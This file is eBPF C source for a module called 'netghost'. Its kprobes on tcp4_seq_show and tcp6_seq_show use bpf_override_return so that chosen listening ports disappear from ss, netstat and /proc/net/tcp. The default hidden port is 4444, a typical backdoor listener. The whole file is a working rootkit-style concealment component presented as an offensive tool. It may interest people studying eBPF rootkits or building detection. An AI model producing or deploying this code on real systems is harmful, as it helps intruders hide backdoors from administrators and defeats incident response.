// netghost.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) = "{"
    "\"name\":\"netghost\","
    "\"desc\":\"Network Port Hiding: Hooks tcp4_seq_show to make listening ports vanish from ss/netstat.\","
    "\"requires\":[\"is_root\",\"kprobe_override\"],"
    "\"options\":{"
        "\"target\":[\"4444\",\"Target port number to hide immediately upon loading\"]"
    "},"
    "\"maps\":{"
        "\"target\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"}"
    "}"
"}";

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u16);
    __type(value, u32);
} target SEC(".maps");

/*
 * kprobe/tcp4_seq_show
 *
 * Function prototype:
 *   int tcp4_seq_show(struct seq_file *seq, void *v)
 *
 * When v == SEQ_START_TOKEN (defined as (void *)1), it is the header row, skip it.
 * v points to a struct sock (actually the common header of struct tcp_sock).
 *
 * We extract the local port (host byte order u16) from sock->__sk_common.skc_num.
 * If it matches the target map, we call bpf_override_return(ctx, 0) to make the
 * seq_show call return 0 directly, writing nothing to the seq_file.
 *
 * Dependencies: CONFIG_BPF_KPROBE_OVERRIDE=y (enabled by default on Kali)
 *               Kernel symbol tcp4_seq_show is kprobe-able (not nokprobe)
 */
SEC("kprobe/tcp4_seq_show")
int BPF_KPROBE(hook_tcp4_seq_show, struct seq_file *seq, void *v)
{
    /* SEQ_START_TOKEN == (void *)1, skip header */
    if (v == (void *)1UL)
        return 0;

    struct sock *sk = (struct sock *)v;

    /* skc_num is the local port, host byte order */
    u16 lport = 0;
    bpf_core_read(&lport, sizeof(lport), &sk->__sk_common.skc_num);

    if (lport == 0)
        return 0;

    u32 *hit = bpf_map_lookup_elem(&target, &lport);
    if (!hit)
        return 0;

    /* Make tcp4_seq_show return 0 directly, not outputting this line */
    bpf_override_return(ctx, 0);
    return 0;
}

/*
 * tcp6_seq_show uses the same principle to hide entries on the IPv6 side
 * (ss -t reads both /proc/net/tcp and /proc/net/tcp6)
 */
SEC("kprobe/tcp6_seq_show")
int BPF_KPROBE(hook_tcp6_seq_show, struct seq_file *seq, void *v)
{
    if (v == (void *)1UL)
        return 0;

    struct sock *sk = (struct sock *)v;

    u16 lport = 0;
    bpf_core_read(&lport, sizeof(lport), &sk->__sk_common.skc_num);

    if (lport == 0)
        return 0;

    u32 *hit = bpf_map_lookup_elem(&target, &lport);
    if (!hit)
        return 0;

    bpf_override_return(ctx, 0);
    return 0;
}